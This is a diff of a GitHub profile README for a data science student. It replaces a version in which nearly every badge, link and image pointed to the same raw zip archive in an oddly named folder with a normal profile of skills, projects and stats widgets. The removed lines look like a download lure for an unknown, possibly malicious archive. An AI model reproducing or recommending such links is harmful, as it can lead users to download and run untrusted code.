@@ -1,36 +1,125 @@
-# 💫 About Me:
-https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip in AI 💻<br> Python & SQL enthusiast <br>| Passionate about creative coding & <br>learning new tech <br>
+<h1 align="center">Hi 👋, I'm Raza Shaikh</h1>
+<h3 align="center">AI & Data Science Engineer | Python Developer | Backend & ML Enthusiast</h3>
 
+---
 
-## 🌐 Socials:
-(https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip shaikh) [![Discord](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip)](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) [![Instagram](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip)](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) [![LinkedIn](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip)](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip Shaikh) 
+## 💫 About Me
+💻 Final Year **B.Tech in AI & Data Science**  
+🤖 Interested in **Artificial Intelligence, Machine Learning & Backend Development**  
+🐍 Strong in **Python, SQL and Data Analysis**  
+☁️ Learning **Cloud + AI Deployment**  
+🚀 Building projects combining **AI + Real World Applications**
 
-# 💻 Tech Stack:
-![C++](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip++-%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%2B%2B&logoColor=white) ![JavaScript](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%23F7DF1E) ![Python](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![Oracle](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![Flask](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![Django](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![OpenCV](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![OpenGL](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![Adobe](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![Adobe Lightroom](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%20Lightroom&logoColor=white) ![NumPy](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![Pandas](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![PyTorch](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![scikit-learn](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip) ![GitHub](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip%https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip)
-# 📊 GitHub Stats:
+---
 
+## 🌐 Connect With Me
 
-![](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip)
+<p align="left">
+<a href="https://github.com/razashaikh26" target="blank">
+<img src="https://skillicons.dev/icons?i=github" />
+</a>
 
-### ✍️ Random Dev Quote
-![](https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip)
+<a href="https://linkedin.com" target="blank">
+<img src="https://skillicons.dev/icons?i=linkedin" />
+</a>
 
+<a href="https://instagram.com" target="blank">
+<img src="https://skillicons.dev/icons?i=instagram" />
+</a>
 
+<a href="https://discord.com" target="blank">
+<img src="https://skillicons.dev/icons?i=discord" />
+</a>
+</p>
 
+---
 
+# 💻 Tech Stack
 
+### Programming
+![Python](https://skillicons.dev/icons?i=python)
+![C++](https://skillicons.dev/icons?i=cpp)
+![JavaScript](https://skillicons.dev/icons?i=javascript)
 
-<!--
-**razashaikh26/razashaikh26** is a ✨ _special_ ✨ repository because its `https://github.com/razashaikh26/razashaikh26/raw/refs/heads/main/unrevenging/razashaikh_2.7-alpha.4.zip` (this file) appears on your GitHub profile.
+### Backend
+![Flask](https://skillicons.dev/icons?i=flask)
+![Django](https://skillicons.dev/icons?i=django)
+![FastAPI](https://skillicons.dev/icons?i=fastapi)
 
-Here are some ideas to get you started:
+### Databases
+![MySQL](https://skillicons.dev/icons?i=mysql)
+![PostgreSQL](https://skillicons.dev/icons?i=postgres)
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+### AI / Data Science
+![PyTorch](https://skillicons.dev/icons?i=pytorch)
+
+- NumPy
+- Pandas
+- Scikit-Learn
+- OpenCV
+- Data Analysis
+- Machine Learning
+
+### Tools
+![Git](https://skillicons.dev/icons?i=git)
+![Docker](https://skillicons.dev/icons?i=docker)
+![Linux](https://skillicons.dev/icons?i=linux)
+
+---
+
+# 🚀 Featured Projects
+
+### 🧠 AI Civic Complaint Classification
+AI system that automatically classifies civic complaints using NLP and machine learning.
+
+**Tech:** Python, ML, NLP
+
+---
+
+### 🚦 Smart Traffic Control System
+Traffic signal optimization system using computer vision to detect vehicle density.
+
+**Tech:** OpenCV, Python, AI
+
+---
+
+### 🏨 Hostel Room Management System
+Role-based system to manage hostel rooms with Admin, Warden and Student roles.
+
+**Tech:** FastAPI, PostgreSQL, JWT Authentication
+
+---
+
+# 📊 GitHub Stats
+
+<p align="center">
+
+<img src="https://github-readme-stats.vercel.app/api?username=razashaikh26&show_icons=true&theme=tokyonight"/>
+
+<img src="https://github-readme-stats.vercel.app/api/top-langs/?username=razashaikh26&layout=compact&theme=tokyonight"/>
+
+</p>
+
+---
+
+# 🔥 GitHub Streak
+
+<p align="center">
+
+<img src="https://streak-stats.demolab.com?user=razashaikh26&theme=tokyonight"/>
+
+</p>
+
+---
+
+# ✍️ Random Dev Quote
+
+<p align="center">
+
+<img src="https://quotes-github-readme.vercel.app/api?type=horizontal&theme=tokyonight"/>
+
+</p>
+
+---
+
+⭐ **Always learning, always building.**
